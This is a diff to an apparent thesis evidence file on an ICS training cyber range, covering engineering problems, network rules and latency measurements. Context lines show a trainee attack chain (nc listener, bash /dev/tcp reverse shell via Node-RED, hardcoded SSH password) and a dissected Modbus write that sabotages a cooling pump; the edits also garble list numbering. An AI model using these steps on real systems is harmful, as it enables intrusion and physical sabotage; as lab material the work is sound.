@@ -1,5 +1,7 @@
 # Thesis Empirical Evidence: RQ2 & RQ3
-*Sources:* 
+
+*Sources:*
+
 - `thesis_data_dumps/` (Simple OT Scenario)
 - `thesis_data_dumps_complex/` (Complex OT Scenario)
 
@@ -21,7 +23,8 @@ Five concrete engineering friction points were encountered and resolved during t
 **Source file:** `provisioning/roles/ews/tasks/main.yml`
 
 **Exact error:**
-```
+
+```text
 fatal: [engineering-station]: FAILED! => {
   "msg": "error: externally-managed-environment
   × This environment is externally managed
@@ -43,16 +46,20 @@ fatal: [engineering-station]: FAILED! => {
 **Source file:** EWS safety monitor daemon script in `provisioning/roles/ews/tasks/main.yml`.
 
 **Exact error:**
-```
+
+```text
 ModbusClientMixin.read_holding_registers() takes 2 positional arguments but 3 were given
 ```
 
 **Root cause:** In `pymodbus` ≥ 3.0, the `count` parameter was changed to **keyword-only** using the Python `*` separator. The EWS daemon called `client.read_holding_registers(0, 1)`, which was valid in pymodbus 2.x but raises a `TypeError` in 3.x. The virtual environment's `pip` resolver installed pymodbus 3.8.x.
 
 **Resolution:**
+
 ```diff
+
 - result = client.read_holding_registers(0, 1)
 + result = client.read_holding_registers(0, count=1)
+
 ```
 
 **Thesis significance:** Open-source ICS tooling (`pymodbus`) undergoes architectural refactoring between major versions with breaking API changes. In a production monitoring context, this failure mode causes the safety monitoring daemon to crash silently — a critical ICS safety gap. This illustrates the dependency management risk of deploying OT software on a general-purpose Linux environment where library versions are not pinned to certified configurations.
@@ -64,12 +71,15 @@ ModbusClientMixin.read_holding_registers() takes 2 positional arguments but 3 we
 **Source file:** Training scenario design for Level 3 (`complex-ot-sandbox`).
 
 **The problem:** The initial non-interactive approach — running SSH via a Node-RED `exec` node:
+
 ```bash
 sshpass -p 'operator123' ssh -o StrictHostKeyChecking=no operator@192.168.20.20 "nmap -sn 192.168.20.0/24"
 ```
+
 …works only for non-interactive commands. When trainees attempt an interactive SSH session from a raw bash reverse shell, the Node-RED `exec` node cannot handle the hidden stdin password prompt. The terminal hangs. Even after obtaining a raw reverse shell via `nc`, running `ssh` causes the session to freeze because the shell has no controlling TTY.
 
 **Resolution (three-step process required):**
+
 1. Start `nc -nlvp 4444` listener on the Kali attacker host.
 2. Trigger the bash reverse shell via Node-RED: `bash -c 'bash -i >& /dev/tcp/10.10.10.50/4444 0>&1'`
 3. **Upgrade to a PTY** before any interactive commands: `python3 -c 'import pty; pty.spawn("/bin/bash")'`
@@ -80,7 +90,8 @@ sshpass -p 'operator123' ssh -o StrictHostKeyChecking=no operator@192.168.20.20 
 
 ### Challenge 4 — Network Segregation: Cloud L3 vs. Purdue Model L4 Enforcement
 
-**Source files:** 
+**Source files:**
+
 - `thesis_data_dumps/router_forward_rules.txt` (Simple)
 - `thesis_data_dumps_complex/router_forward_rules.txt` (Complex)
 
@@ -89,12 +100,15 @@ sshpass -p 'operator123' ssh -o StrictHostKeyChecking=no operator@192.168.20.20 
 **Resolution:** A custom Ansible `router` role was developed to inject `iptables FORWARD DROP` rules into the `ot-gateway` VM at boot.
 
 - **Simple Sandbox iptables:**
-  ```
+
+  ```text
   -A FORWARD -s 10.10.10.50/32 -d 192.168.99.10/32 -p tcp -m tcp --dport 8080 -j DROP
   -A FORWARD -s 10.10.10.50/32 -d 192.168.99.10/32 -p tcp -m tcp --dport 502  -j DROP
   ```
+
 - **Complex Sandbox iptables:**
-  ```
+
+  ```text
   -A FORWARD -s 10.10.10.0/24 -d 192.168.20.10/32 -j DROP
   -A FORWARD -s 10.10.10.0/24 -d 192.168.20.20/32 -j DROP
   -A FORWARD -s 192.168.100.10/32 -d 192.168.20.10/32 -j DROP
@@ -114,6 +128,7 @@ sshpass -p 'operator123' ssh -o StrictHostKeyChecking=no operator@192.168.20.20 
 **The problem:** The Ansible `creates:` idempotency guard pointed to `openplc.db`, which is checked into the repository pre-seeded. Ansible detected this file as already present, skipped the `install.sh` compilation stage entirely, and left the MatIEC compiler (`iec2c`) binary absent — causing the OpenPLC web service to fail to compile any ladder logic programs on subsequent sandbox rebuilds.
 
 **Resolution:** The `creates:` guard was changed to target `start_openplc.sh`, which is only generated upon successful completion of the OpenPLC build system:
+
 ```yaml
 args:
   creates: /opt/OpenPLC_v3/start_openplc.sh
@@ -166,8 +181,9 @@ args:
 **The problem:** When iterating and debugging sandbox topologies or training files (e.g., `topology.yml` or `training.json`), developers commit changes to their Git repository. However, the CyberRangeCZ web portal lacks an "Update" or "Pull" button to refresh an existing imported definition from the remote repository. Furthermore, when deleting an old definition and creating a new one pointing to the same Git repository and branch, the backend portal cache often retains a copy of the old commits rather than pulling the latest code from the remote server, causing developers to deploy outdated configurations.
 
 **Resolution:** To force a cache bypass and pull the latest code during sandbox development:
-1.  **Unique Revision Tags:** Use a unique commit hash (e.g. `5ab3c89`) or a unique branch name/tag instead of the generic `main` branch label in the definition form. This forces the portal's backend git downloader to treat it as a distinct revision and fetch it fresh from the remote repository.
-2.  **Portal Service Restart (Root Clean):** For local self-deployed instances, clearing the portal containers' volume caches or restarting the backend server components forces a cache invalidation.
+
+4. **Unique Revision Tags:** Use a unique commit hash (e.g. `5ab3c89`) or a unique branch name/tag instead of the generic `main` branch label in the definition form. This forces the portal's backend git downloader to treat it as a distinct revision and fetch it fresh from the remote repository.
+5. **Portal Service Restart (Root Clean):** For local self-deployed instances, clearing the portal containers' volume caches or restarting the backend server components forces a cache invalidation.
 
 **Thesis significance:** Highlights the lifecycle iteration bottlenecks of modern cyber ranges. While Infrastructure as Code (IaC) allows fast scripting changes, platform caching architectures designed for student isolation can actively impede the developer iteration cycle during scenario engineering.
 
@@ -308,7 +324,8 @@ Exposed listening ports by node type:
 *Source: `router_routing.txt` in both dumps*
 
 **Simple Router Routing Table:**
-```
+
+```text
 default via 100.100.100.174 dev ens4
 10.10.10.0/24     dev ens5  src 10.10.10.1    (corporate/management)
 100.100.100.0/24  dev ens4  src 100.100.100.6 (WAN)
@@ -316,7 +333,8 @@ default via 100.100.100.174 dev ens4
 ```
 
 **Complex Router Routing Table:**
-```
+
+```text
 default via 100.100.100.174 dev ens4
 10.10.10.0/24     dev ens5  src 10.10.10.1    (corporate/attacker subnet)
 100.100.100.0/24  dev ens4  src 100.100.100.6 (WAN)
@@ -333,7 +351,7 @@ default via 100.100.100.174 dev ens4
 
 CPU time consumed by runtimes relative to actual VM uptime:
 
-- **OpenPLC Core Runtime (`./core/openplc`):** 
+- **OpenPLC Core Runtime (`./core/openplc`):**
   - *Simple:* **1.479 seconds** CPU time over 83s uptime = **~1.8% average CPU load** of 1 vCPU.
   - *Complex:* **13.114 seconds** CPU time over 3,480s uptime = **~0.37% average CPU load** of 1 vCPU.
 - **Node-RED HMI Runtime (`node`):**
@@ -361,9 +379,10 @@ CPU time consumed by runtimes relative to actual VM uptime:
 | **Jitter (stdev)** | **0.137 ms** | **0.103 ms** | **< 0.05 ms** (determinism limit) |
 
 **Analysis for Thesis:**
-1. **Network Overhead:** Traversing the virtualized OpenStack Neutron network gateway (`ot-gateway`) introduces an average network transit latency of **0.590 ms** for standard ICMP packets.
-2. **Application Processing Overhead:** The Modbus TCP application layer adds minimal additional overhead (**~0.096 ms** difference between ICMP average RTT and Modbus average RTT), indicating that the OpenPLC Python/C++ server runtime handles packet transactions efficiently at rest.
-3. **Comparative Jitter Overhead:** The measured Modbus application jitter (**0.103 ms**) is roughly **2× higher** than a hardware PLC RTOS baseline target (< 0.05 ms). This demonstrates the latency variations introduced by standard Linux kernel process scheduling (`SCHED_OTHER`) even at idle state. Under active hypervisor load, this jitter is expected to scale significantly, validating the non-deterministic nature of emulated environments.
+
+6. **Network Overhead:** Traversing the virtualized OpenStack Neutron network gateway (`ot-gateway`) introduces an average network transit latency of **0.590 ms** for standard ICMP packets.
+7. **Application Processing Overhead:** The Modbus TCP application layer adds minimal additional overhead (**~0.096 ms** difference between ICMP average RTT and Modbus average RTT), indicating that the OpenPLC Python/C++ server runtime handles packet transactions efficiently at rest.
+8. **Comparative Jitter Overhead:** The measured Modbus application jitter (**0.103 ms**) is roughly **2× higher** than a hardware PLC RTOS baseline target (< 0.05 ms). This demonstrates the latency variations introduced by standard Linux kernel process scheduling (`SCHED_OTHER`) even at idle state. Under active hypervisor load, this jitter is expected to scale significantly, validating the non-deterministic nature of emulated environments.
 
 ---
 
@@ -377,13 +396,13 @@ The Modbus TCP write payload captured during the EWS-to-PLC sabotage phase conta
 
 #### Packet Dissection:
 
-1. **`00 01`** — **Transaction Identifier:** 2 bytes. Uniquely identifies the request/response transaction.
-2. **`00 00`** — **Protocol Identifier:** 2 bytes. `0` indicates Modbus TCP.
-3. **`00 06`** — **Length:** 2 bytes. Specifies that 6 bytes follow.
-4. **`01`** — **Unit Identifier:** 1 byte. Slave device address (default is 1).
-5. **`06`** — **Function Code:** 1 byte. `0x06` instructs the PLC to **Write Single Register**.
-6. **`00 00`** — **Reference Address:** 2 bytes. Targets holding register 0 (mapped to the cooling pump).
-7. **`27 0f`** — **Register Value:** 2 bytes. Hexadecimal value `0x270F` (decimal `9999`), which represents the override sabotage flag value.
+9. **`00 01`** — **Transaction Identifier:** 2 bytes. Uniquely identifies the request/response transaction.
+10. **`00 00`** — **Protocol Identifier:** 2 bytes. `0` indicates Modbus TCP.
+11. **`00 06`** — **Length:** 2 bytes. Specifies that 6 bytes follow.
+12. **`01`** — **Unit Identifier:** 1 byte. Slave device address (default is 1).
+13. **`06`** — **Function Code:** 1 byte. `0x06` instructs the PLC to **Write Single Register**.
+14. **`00 00`** — **Reference Address:** 2 bytes. Targets holding register 0 (mapped to the cooling pump).
+15. **`27 0f`** — **Register Value:** 2 bytes. Hexadecimal value `0x270F` (decimal `9999`), which represents the override sabotage flag value.
 
 ---
 
